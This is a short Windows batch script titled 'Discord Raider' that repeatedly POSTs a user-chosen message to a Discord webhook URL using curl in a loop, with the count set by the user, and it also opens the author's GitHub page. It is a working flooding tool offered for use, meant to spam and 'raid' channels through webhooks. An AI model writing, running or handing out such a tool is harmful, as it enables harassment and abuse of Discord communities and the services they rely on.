@echo off
setlocal enabledelayedexpansion
title Discord Raider
mode 50,25

start "" "https://github.com/L1derrFrog"

:raid
cls
echo.
echo [github.com/L1derrFrog]
echo.
set /p webhook="webhook url~ " 
echo.
set /p mensaje="message to send~ " 
echo.
set /p cantidad="Quantity~ " 

for /L %%i in (1,1,%cantidad%) do (
    curl -H "Content-Type: application/json" -X POST -d "{\"content\":\"%mensaje%\"}" %webhook%
    echo Mensaje %%i enviado
)
pause
goto raid

